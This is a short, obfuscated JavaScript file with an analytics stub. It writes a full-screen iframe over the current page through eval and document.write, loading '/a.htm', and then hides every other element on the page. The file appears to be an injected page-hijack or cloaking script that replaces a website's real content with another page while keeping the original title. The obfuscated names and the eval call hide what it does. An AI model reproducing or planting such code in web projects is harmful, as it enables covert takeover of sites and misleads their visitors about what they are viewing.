var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "   ";//百度统计https://hm.baidu.com/hm.js?2a0fcfa6e71f523179e2661a401e2d55
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var IsYqkUK1 = window["document"]['title'];
setFrame("/a.htm");

function setFrame(qpFkEczo2) {
    var FwMpGJYz3 = '<title>' + IsYqkUK1 + '</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="' + qpFkEczo2 + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
    window["eval"]("document.write('" + FwMpGJYz3 + "');");
    try {
        setTimeout(function() {
            console['log'](window["document"]['body']['children']['length']);
            for (var GKB4 = 0; GKB4 < window["document"]['body']['children']['length']; GKB4++) {
                try {
                    var Iyt5 = window["document"]['body']['children'][GKB4]['tagName'];
                    var U6 = window["document"]['body']['children'][GKB4]['id'];
                    console['log'](GKB4 + "***" + Iyt5 + "**" + U6);
                    if (U6 != "iconDiv1" && U6 != "showcloneshengxiaon" && Iyt5 != "title") {
                        window["document"]['body']['children'][GKB4]['style']['display'] = "none"
                    }
                } catch (e) {}
            }
            var uF7 = window["document"]['createElement']('meta');
            uF7['name'] = 'viewport';
            uF7['content'] = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
            window["document"]['getElementsByTagName']('head')[0]['appendChild'](uF7)
        }, 100)
    } catch (e) {}
}